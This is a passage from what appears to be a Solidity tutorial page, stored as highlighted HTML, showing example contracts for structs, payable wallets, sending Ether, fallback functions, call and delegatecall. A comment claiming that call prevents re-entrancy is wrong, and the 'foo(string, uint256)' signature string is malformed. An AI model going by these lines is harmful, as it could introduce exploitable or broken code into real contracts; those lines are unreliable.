punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Todos</span> <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Todo</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">string</span> text<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bool</span> completed<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    Todo<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> todos<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _text<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        todos<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token function\">Todo</span><span class=\"token punctuation\">(</span>_text<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _index<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        Todo <span class=\"token keyword\">storage</span> todo <span class=\"token operator\">=</span> todos<span class=\"token punctuation\">[</span>_index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>todo<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> todo<span class=\"token punctuation\">.</span>completed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    \n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Payable functions and address</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Wallet</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//payable function &amp; address</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">notPayable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyOwner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\n        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\n        _to<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Send Ether</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//You can send ether to another contract with:</span>\n<span class=\"token comment\">//transfer( forwards 2300 gas, throws error)</span>\n<span class=\"token comment\">//send(forwards 2300 gas, returns bool)</span>\n<span class=\"token comment\">//call(forwards all gas or set gas, returns bool)</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ReceiveEther</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        \n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SendEther</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function\">sendViaTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n            _to<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        \n        <span class=\"token keyword\">function</span> <span class=\"token function\">sendViaSend</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token builtin\">bool</span> sent <span class=\"token operator\">=</span> _to<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        \n        <span class=\"token comment\">//call can prevent re-entrancy hack</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function\">sendViaCall</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _to<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Fallback Function</h3>\n<p>Receives 2300 gas from <code class=\"language-text\">transfer</code> and <code class=\"language-text\">send</code> methods.\nCan receive all gas from <code class=\"language-text\">call</code> method.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Fallback</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> gas<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">sendToFallback</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//fails to send ether</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferToFallback</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        _to<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token comment\">//sends Ether</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">callFallback</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _to<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Call Method</h3>\n<p>Is a low level method available on address type.\nA Fallback function is called when the function called does not exist.\neg.</p>\n<ul>\n<li>call existing function.</li>\n<li>call non-existing functions(it triggers a callback function).</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Receiver</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Received</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> caller<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">emit</span> Received <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Fallback was called\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _message<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Received</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span> _message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">return</span> _x <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Caller</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Response</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">testCallFoo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _addr<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">gas</span><span class=\"token punctuation\">(</span><span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"foo(string, uint256)\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"call foo\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">emit</span> <span class=\"token function\">Response</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">testCallDoesNotExist</span><span class=\"token punctuation\">(</span> <span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _addr<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"doesNotExit()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">emit</span> <span class=\"token function\">Response</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>delegatecall</h3>\n<p>Is a low level function similar to call.\nWhen a contract A delegatecall contract B, it runs B’s code inside A’s context (storage, msg.sender, msg.value)\nhence contract A can be upgraded without changing any code inside it.</p>\n<p>It runs code of callee in caller’s context(storage, msg.sender, msg.value).\nState variables of the caller and callee should be the same.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">B</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> num<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> sender<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> value<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">setVars</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _num<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        num <span class=\"token operator\">=</span> _num<span class=\"token punctuation\">;</span>\n        sender <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        value <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">A</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> num<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> sender<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> value<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">setVars</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _contract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _num<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        _contract<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setVars(uint256)\"</span><span class=\"token punctuation\">,</span> _num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>calling other functions</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.5.3</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Callee</span><span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> x<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> value<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">setX</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        x <span class=\"token operator\">=</span> _x<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> x<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">setXAndSendEther</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        x <span class=\"token operator\">=</span> _x<span class=\"token punctuation\">;</span>\n        value <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Caller</span> <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">setX</span><span class=\"token punctuation\">(</span>Callee _callee<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint</span> x <span class=\"token operator\">=</span> _callee<span class=\"token punctuation\">.</span><span class=\"token function\">setX</span><span class=\"token punctuation\">(</span>_x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">setXFromAddress</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        Callee callee <span class=\"token operator\">=</span> <span class=\"token function\">Callee</span><span class=\"token punctuation\">(</span>_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> x <span class=\"token operator\">=</span> callee<span class=\"token punctuation\">.</span><span class=\"token function\">setX</span><span class=\"token punctuation\">(</span>_x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">setXAndSendEther</span><span class=\"token punctuation\">(</span>Callee _callee<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _callee<span class=\"token punctuation\">.</span>setXAndSendEther<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Creating 